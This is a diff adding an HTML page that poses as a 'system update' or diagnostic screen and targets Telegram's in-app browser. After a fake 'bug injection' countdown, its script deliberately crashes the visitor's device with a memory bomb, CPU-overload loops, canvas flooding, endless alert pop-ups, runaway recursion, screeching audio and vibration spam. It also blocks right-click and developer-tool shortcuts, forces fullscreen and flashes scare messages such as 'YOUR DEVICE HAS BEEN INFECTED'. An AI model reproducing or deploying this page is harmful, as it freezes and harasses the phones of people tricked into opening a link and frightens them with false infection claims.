@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>⚡ SYSTEM UPDATE ⚡</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0a0f0f 0%, #030505 100%);
+            font-family: 'Courier New', 'Monaco', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Matrix rain effect */
+        #matrixCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.2;
+            z-index: 0;
+        }
+
+        /* Container */
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 90%;
+            max-width: 500px;
+            margin: 20px;
+        }
+
+        /* Card */
+        .card {
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(15px);
+            border-radius: 30px;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(0, 255, 255, 0.1);
+            animation: borderPulse 2s infinite;
+        }
+
+        @keyframes borderPulse {
+            0%, 100% { border-color: rgba(0, 255, 255, 0.3); box-shadow: 0 0 30px rgba(0, 255, 255, 0.1); }
+            50% { border-color: rgba(0, 255, 255, 0.8); box-shadow: 0 0 60px rgba(0, 255, 255, 0.3); }
+        }
+
+        /* Icon */
+        .icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: iconPulse 1s infinite;
+        }
+
+        @keyframes iconPulse {
+            0%, 100% { transform: scale(1); text-shadow: 0 0 10px cyan; }
+            50% { transform: scale(1.1); text-shadow: 0 0 30px cyan; }
+        }
+
+        /* Title */
+        .title {
+            color: #00ffff;
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+
+        /* Status */
+        .status {
+            color: #0ff;
+            font-size: 14px;
+            margin: 20px 0;
+            padding: 10px;
+            background: rgba(0, 255, 255, 0.1);
+            border-radius: 10px;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        /* Progress bar */
+        .progress-container {
+            margin: 30px 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(0, 255, 255, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0ff, #00aaff);
+            width: 0%;
+            border-radius: 10px;
+            transition: width 0.1s linear;
+        }
+
+        .progress-text {
+            color: #0ff;
+            font-size: 12px;
+            margin-top: 10px;
+            font-family: monospace;
+        }
+
+        /* Message box */
+        .message-box {
+            background: rgba(0, 0, 0, 0.6);
+            border-left: 3px solid #0ff;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .message-text {
+            color: #0ff;
+            font-size: 13px;
+            line-height: 1.6;
+            font-family: monospace;
+        }
+
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 15px;
+            background: #0ff;
+            vertical-align: middle;
+            margin-left: 5px;
+            animation: cursorBlink 1s infinite;
+        }
+
+        @keyframes cursorBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* Counter */
+        .counter {
+            font-size: 48px;
+            color: #0ff;
+            font-weight: bold;
+            margin: 20px 0;
+            font-family: monospace;
+            text-shadow: 0 0 10px cyan;
+        }
+
+        /* Button */
+        .btn {
+            background: transparent;
+            border: 1px solid #0ff;
+            padding: 12px 30px;
+            color: #0ff;
+            font-size: 14px;
+            border-radius: 25px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s;
+            font-family: monospace;
+        }
+
+        .btn:hover {
+            background: rgba(0, 255, 255, 0.2);
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+        }
+
+        /* Glitch effect */
+        .glitch {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, rgba(0,255,255,0.05) 0px, rgba(0,255,255,0.05) 2px, transparent 2px, transparent 4px);
+            pointer-events: none;
+            z-index: 20;
+            animation: scan 0.1s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(100%); }
+        }
+
+        /* Crash overlay */
+        .crash-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            animation: fadeIn 0.2s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .crash-icon {
+            font-size: 100px;
+            animation: crashShake 0.1s infinite;
+        }
+
+        @keyframes crashShake {
+            0%,100% { transform: translate(0,0); }
+            25% { transform: translate(-10px,10px); }
+            75% { transform: translate(10px,-10px); }
+        }
+
+        .crash-title {
+            color: #ff0000;
+            font-size: 28px;
+            font-weight: bold;
+            margin: 20px;
+            animation: redBlink 0.2s infinite;
+        }
+
+        @keyframes redBlink {
+            0%,100% { opacity: 1; text-shadow: 0 0 20px red; }
+            50% { opacity: 0.5; text-shadow: 0 0 50px red; }
+        }
+
+        .crash-message {
+            color: #ff6666;
+            font-size: 16px;
+            margin: 10px;
+            font-family: monospace;
+        }
+
+        .bug-sent {
+            color: #0ff;
+            font-size: 14px;
+            margin-top: 30px;
+            border-top: 1px solid #0ff;
+            padding-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrixCanvas"></canvas>
+    <div class="glitch"></div>
+    
+    <div class="container" id="mainContainer">
+        <div class="card">
+            <div class="icon">⚡🌀⚡</div>
+            <div class="title">SYSTEM DIAGNOSTIC</div>
+            <div class="status">⚠️ CONNECTION ESTABLISHED ⚠️</div>
+            
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-text" id="progressText">Initializing connection...</div>
+            </div>
+            
+            <div class="message-box">
+                <div class="message-text">
+                    > Establishing secure channel...<span class="cursor"></span><br>
+                    > Target: Telegram WebView<br>
+                    > Protocol: CYBER-BUG v4.0<br>
+                    > Status: <span id="statusText">CONNECTING</span>
+                </div>
+            </div>
+            
+            <div class="counter" id="counter">10</div>
+            
+            <button class="btn" id="cancelBtn" style="display: none;">⚠️ CANCEL ⚠️</button>
+        </div>
+    </div>
+    
+    <div class="crash-overlay" id="crashOverlay">
+        <div class="crash-icon">💀🐛💀</div>
+        <div class="crash-title">!!! BUG HAS BEEN SENT !!!</div>
+        <div class="crash-message" id="crashMessage">YOUR DEVICE HAS BEEN INFECTED</div>
+        <div class="crash-message" style="font-size: 12px; margin-top: 20px;">━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>
+        <div class="bug-sent">
+            🔥 BUG SUCCESSFULLY DELIVERED TO YOUR DEVICE 🔥<br>
+            📱 SYSTEM CRASH IN PROGRESS...<br>
+            💀 DO NOT CLOSE THIS PAGE 💀
+        </div>
+    </div>
+
+    <script>
+        // Matrix background
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
+        const charArray = chars.split("");
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        
+        for(let i = 0; i < columns; i++) {
+            drops[i] = 1;
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = "#0ff";
+            ctx.font = fontSize + "px monospace";
+            
+            for(let i = 0; i < drops.length; i++) {
+                const text = charArray[Math.floor(Math.random() * charArray.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 50);
+        
+        // ==================== CRASH FUNCTIONS ====================
+        
+        function playScreechSound() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const now = audioCtx.currentTime;
+                
+                // High frequency screech
+                const osc1 = audioCtx.createOscillator();
+                const gain1 = audioCtx.createGain();
+                osc1.type = 'sawtooth';
+                osc1.frequency.value = 2000;
+                gain1.gain.value = 0.5;
+                osc1.connect(gain1);
+                gain1.connect(audioCtx.destination);
+                osc1.start();
+                gain1.gain.exponentialRampToValueAtTime(0.0001, now + 2);
+                osc1.stop(now + 2);
+                
+                // Random noise
+                const bufferSize = 4096;
+                const noiseNode = audioCtx.createScriptProcessor(bufferSize, 1, 1);
+                noiseNode.onaudioprocess = function(e) {
+                    const output = e.outputBuffer.getChannelData(0);
+                    for(let i = 0; i < bufferSize; i++) {
+                        output[i] = Math.random() * 2 - 1;
+                    }
+                };
+                const noiseGain = audioCtx.createGain();
+                noiseGain.gain.value = 0.3;
+                noiseNode.connect(noiseGain);
+                noiseGain.connect(audioCtx.destination);
+                setTimeout(() => noiseNode.disconnect(), 3000);
+                
+            } catch(e) {}
+        }
+        
+        function vibrateSpam() {
+            if(navigator.vibrate) {
+                const interval = setInterval(() => {
+                    navigator.vibrate([500, 200, 500, 200, 1000, 500]);
+                }, 800);
+                return interval;
+            }
+            return null;
+        }
+        
+        function memoryBomb() {
+            const memory = [];
+            const interval = setInterval(() => {
+                for(let i = 0; i < 100; i++) {
+                    memory.push(new Array(2000000).fill('💀🐛💀'));
+                }
+            }, 10);
+            return interval;
+        }
+        
+        function cpuOverload() {
+            function heavyLoop() {
+                const start = Date.now();
+                while(Date.now() - start < 100) {
+                    for(let i = 0; i < 50000; i++) {
+                        Math.sin(Math.cos(Math.tan(Math.random() * Math.random())));
+                    }
+                }
+                requestAnimationFrame(heavyLoop);
+            }
+            for(let i = 0; i < 30; i++) {
+                heavyLoop();
+            }
+        }
+        
+        function canvasBomb() {
+            const bombCanvas = document.createElement('canvas');
+            bombCanvas.width = window.innerWidth;
+            bombCanvas.height = window.innerHeight;
+            bombCanvas.style.position = 'fixed';
+            bombCanvas.style.top = 0;
+            bombCanvas.style.left = 0;
+            bombCanvas.style.zIndex = 100000;
+            bombCanvas.style.pointerEvents = 'none';
+            document.body.appendChild(bombCanvas);
+            const bombCtx = bombCanvas.getContext('2d');
+            
+            function draw() {
+                for(let i = 0; i < 300; i++) {
+                    bombCtx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 50}, ${Math.random() * 255})`;
+                    bombCtx.fillRect(Math.random() * bombCanvas.width, Math.random() * bombCanvas.height, 20, 20);
+                }
+                requestAnimationFrame(draw);
+            }
+            draw();
+        }
+        
+        function alertSpam() {
+            setInterval(() => {
+                alert("💀 BUG ACTIVATED - SYSTEM CRASHING 💀");
+            }, 100);
+        }
+        
+        function stackOverflow() {
+            function recursive() {
+                recursive();
+            }
+            setTimeout(() => recursive(), 500);
+        }
+        
+        function startCrash() {
+            // Play screeching sound
+            playScreechSound();
+            
+            // Vibrate spam
+            vibrateSpam();
+            
+            // Memory bomb
+            memoryBomb();
+            
+            // CPU overload
+            cpuOverload();
+            
+            // Canvas bomb
+            canvasBomb();
+            
+            // Alert spam after 1 second
+            setTimeout(() => {
+                alertSpam();
+            }, 1000);
+            
+            // Stack overflow after 2 seconds
+            setTimeout(() => {
+                stackOverflow();
+            }, 2000);
+        }
+        
+        // ==================== MAIN EXECUTION ====================
+        
+        let countdown = 10;
+        let progress = 0;
+        const counterElement = document.getElementById('counter');
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+        const statusText = document.getElementById('statusText');
+        
+        // Detect if opened in Telegram
+        const isTelegram = navigator.userAgent.includes('Telegram') || window.location.href.includes('tgWebView');
+        
+        if(isTelegram) {
+            statusText.innerHTML = "TELEGRAM DETECTED ✓";
+            statusText.style.color = "#0ff";
+        } else {
+            statusText.innerHTML = "PLEASE OPEN IN TELEGRAM";
+            statusText.style.color = "#ff6600";
+        }
+        
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            progress = ((10 - countdown) / 10) * 100;
+            
+            counterElement.innerHTML = countdown;
+            progressFill.style.width = progress + '%';
+            progressText.innerHTML = `Bug injection progress: ${Math.floor(progress)}%`;
+            
+            if(countdown <= 0) {
+                clearInterval(countdownInterval);
+                
+                // Update status
+                progressText.innerHTML = "Bug injection: COMPLETE!";
+                progressFill.style.width = '100%';
+                counterElement.innerHTML = "💀";
+                
+                // Show crash overlay
+                setTimeout(() => {
+                    document.getElementById('mainContainer').style.display = 'none';
+                    document.getElementById('crashOverlay').style.display = 'flex';
+                    
+                    // Start crash
+                    startCrash();
+                    
+                    // Update message
+                    const msgElement = document.getElementById('crashMessage');
+                    const messages = [
+                        "YOUR DEVICE HAS BEEN INFECTED",
+                        "SYSTEM CORRUPTION DETECTED",
+                        "MEMORY OVERFLOW INITIATED",
+                        "CPU OVERLOAD ACTIVATED",
+                        "DEVICE BRICK IN PROGRESS"
+                    ];
+                    let msgIndex = 0;
+                    setInterval(() => {
+                        msgElement.innerHTML = messages[msgIndex % messages.length];
+                        msgIndex++;
+                    }, 800);
+                    
+                }, 500);
+            }
+        }, 1000);
+        
+        // Cancel button (hidden but can be enabled)
+        document.getElementById('cancelBtn').addEventListener('click', () => {
+            if(confirm("⚠️ CANCEL BUG INJECTION?\nThis will not stop the process if already sent.")) {
+                // Just a fake cancel
+                alert("❌ Cannot cancel! Bug already injected!");
+            }
+        });
+        
+        // Anti inspect
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('keydown', (e) => {
+            if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Fullscreen
+        document.documentElement.requestFullscreen().catch(() => {});
+        
+        // Title blink
+        let titles = ["⚡ BUG INJECTION ⚡", "💀 SYSTEM CRASH 💀", "🐛 BUG SENT 🐛"];
+        let idx = 0;
+        setInterval(() => {
+            document.title = titles[idx % titles.length];
+            idx++;
+        }, 500);
+        
+        // Vibration on start
+        if(navigator.vibrate) {
+            navigator.vibrate(500);
+        }
+        
+        console.log("%c🔥 CYBER-BUG v4.0 ACTIVATED 🔥", "color: cyan; font-size: 16px;");
+        console.log("%c💀 BUG WILL BE SENT IN 10 SECONDS 💀", "color: red; font-size: 14px;");
+        console.log("%c⚠️ DO NOT CLOSE THIS PAGE ⚠️", "color: orange; font-size: 12px;");
+    </script>
+</body>
+</html>
